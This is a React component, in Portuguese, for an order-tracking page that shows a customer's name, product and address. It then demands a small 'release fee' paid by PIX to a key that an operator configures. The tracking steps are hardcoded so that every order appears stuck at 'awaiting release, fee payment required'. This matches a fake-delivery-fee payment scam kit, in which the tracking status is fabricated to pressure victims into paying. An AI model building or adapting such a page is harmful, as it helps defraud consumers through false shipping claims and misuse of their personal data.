import { useState } from "react";
import { trpc } from "../lib/trpc";

interface RastreioPageProps {
  orderNumber: string;
}

export default function RastreioPage({ orderNumber }: RastreioPageProps) {
  const clientQuery = trpc.clients.getByOrderNumber.useQuery({ orderNumber });
  const [showPayment, setShowPayment] = useState(false);
  const [copied, setCopied] = useState(false);

  const client = clientQuery.data;

  const configQuery = trpc.tracking.getPublicConfig.useQuery(
    { userId: client?.userId ?? 0 },
    { enabled: !!client }
  );

  const config = configQuery.data;

  if (clientQuery.isLoading) {
    return (
      <div className="rastreio-loading">
        <div className="rastreio-spinner" />
        <p>Carregando informacoes de rastreio...</p>
      </div>
    );
  }

  if (!client) {
    return (
      <div className="rastreio-loading">
        <p>Pedido nao encontrado.</p>
      </div>
    );
  }

  const title = config?.title ?? "Frete Transportadora";
  const pixValue = config?.pixValue ?? "4,99";
  const pixKey = config?.pixKey ?? "";
  const message = config?.message ?? "Aguardando pagamento de taxa de liberacao.";
  const buttonText = config?.buttonText ?? "Liberamento de Pedido";

  const copyPixKey = () => {
    if (pixKey) {
      navigator.clipboard.writeText(pixKey);
      setCopied(true);
      setTimeout(() => setCopied(false), 3000);
    }
  };

  if (showPayment) {
    return (
      <div className="rastreio-page">
        <div className="rastreio-card rastreio-payment-card">
          <div className="rastreio-payment-icon">
            <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#d4a017" strokeWidth="2">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
            </svg>
          </div>
          <h2 className="rastreio-payment-title">
            {title} {pixValue}
          </h2>
          <p className="rastreio-payment-msg">{message}</p>

          <div className="rastreio-pix-box">
            <p className="rastreio-pix-label">
              {pixKey || "Sua chave PIX aparecera aqui"}
            </p>
          </div>

          <button className="rastreio-copy-btn" onClick={copyPixKey}>
            {copied ? "COPIADO!" : "COPIAR CHAVE PIX"}
          </button>

          <a href="#" className="rastreio-link" onClick={(e) => { e.preventDefault(); setShowPayment(false); }}>
            Voltar ao rastreio
          </a>
        </div>
      </div>
    );
  }

  return (
    <div className="rastreio-page">
      <div className="rastreio-card">
        <h1 className="rastreio-title">Rastreamento de Pedido</h1>

        <div className="rastreio-info">
          <div className="rastreio-field">
            <span className="rastreio-label">Cliente:</span>
            <span className="rastreio-value">{client.name}</span>
          </div>
          <div className="rastreio-field">
            <span className="rastreio-label">Ordem:</span>
            <span className="rastreio-value">{client.orderNumber}</span>
          </div>
          {client.product && (
            <div className="rastreio-field">
              <span className="rastreio-label">Produto:</span>
              <span className="rastreio-value">{client.product}</span>
            </div>
          )}
          {client.address && (
            <div className="rastreio-field">
              <span className="rastreio-label">Endereco:</span>
              <span className="rastreio-value">{client.address}</span>
            </div>
          )}
        </div>

        {/* Tracking Steps */}
        <div className="rastreio-steps">
          <div className="rastreio-step completed">
            <div className="rastreio-step-dot" />
            <div className="rastreio-step-info">
              <div className="rastreio-step-title">Pedido recebido</div>
              <div className="rastreio-step-desc">Seu pedido foi registrado no sistema</div>
            </div>
          </div>
          <div className="rastreio-step completed">
            <div className="rastreio-step-dot" />
            <div className="rastreio-step-info">
              <div className="rastreio-step-title">Em processamento</div>
              <div className="rastreio-step-desc">Pedido sendo preparado para envio</div>
            </div>
          </div>
          <div className="rastreio-step active">
            <div className="rastreio-step-dot" />
            <div className="rastreio-step-info">
              <div className="rastreio-step-title">Aguardando liberacao</div>
              <div className="rastreio-step-desc">Pagamento de taxa necessario</div>
            </div>
          </div>
          <div className="rastreio-step">
            <div className="rastreio-step-dot" />
            <div className="rastreio-step-info">
              <div className="rastreio-step-title">Em transito</div>
              <div className="rastreio-step-desc">Pedido a caminho</div>
            </div>
          </div>
          <div className="rastreio-step">
            <div className="rastreio-step-dot" />
            <div className="rastreio-step-info">
              <div className="rastreio-step-title">Entregue</div>
              <div className="rastreio-step-desc">Pedido entregue com sucesso</div>
            </div>
          </div>
        </div>

        <button className="rastreio-action-btn" onClick={() => setShowPayment(true)}>
          {buttonText}
        </button>
      </div>
    </div>
  );
}
